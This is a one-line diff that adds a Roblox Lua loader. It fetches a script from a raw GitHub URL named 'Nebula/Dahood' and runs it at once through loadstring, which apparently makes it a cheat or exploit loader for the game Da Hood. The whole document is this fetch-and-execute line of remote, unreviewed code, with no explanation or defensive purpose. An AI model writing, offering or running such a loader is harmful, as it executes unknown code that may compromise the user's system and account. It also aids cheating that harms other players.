@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Feimgps/Nebula/refs/heads/main/Dahood"))()
